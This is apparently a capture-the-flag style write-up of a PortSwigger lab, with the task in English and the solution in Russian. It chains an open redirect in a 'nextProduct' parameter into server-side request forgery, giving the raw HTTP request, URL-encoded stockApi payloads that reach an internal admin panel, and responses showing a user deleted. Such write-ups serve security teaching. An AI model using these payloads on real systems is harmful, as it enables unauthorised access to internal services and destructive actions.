# SSRF with filter bypass via open redirection vulnerability
PRACTITIONER

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

## Решение
Обработчик ссылки "Next product", расположенной в нижнем правом углу страницы, содержит уязвимость Open Redirect:
```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: 0a1200b804e5ee8d80192b5d00cf00dc.web-security-academy.net
Cookie: session=hym1zhR5RZ6xEOqcWQ0h8ppowJesIaLX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1200b804e5ee8d80192b5d00cf00dc.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


```
```
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```
Закодирую `/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin` в URL-encoding и передам в качестве значения параметра stockApi:

`stockApi=%2f%70%72%6f%64%75%63%74%2f%6e%65%78%74%50%72%6f%64%75%63%74%3f%63%75%72%72%65%6e%74%50%72%6f%64%75%63%74%49%64%3d%31%26%70%61%74%68%3d%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%32%3a%38%30%38%30%2f%61%64%6d%69%6e`

```
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```
Закодирую `/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos` в URL-encoding:

`%2f%70%72%6f%64%75%63%74%2f%6e%65%78%74%50%72%6f%64%75%63%74%3f%63%75%72%72%65%6e%74%50%72%6f%64%75%63%74%49%64%3d%31%26%70%61%74%68%3d%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%32%3a%38%30%38%30%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73`

```
<section>
    <p>User deleted successfully!</p>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/http://192.168.0.12:8080/admin/delete?username=wiener">Delete</a>
    </div>
</section>
```
Задание выполнено.
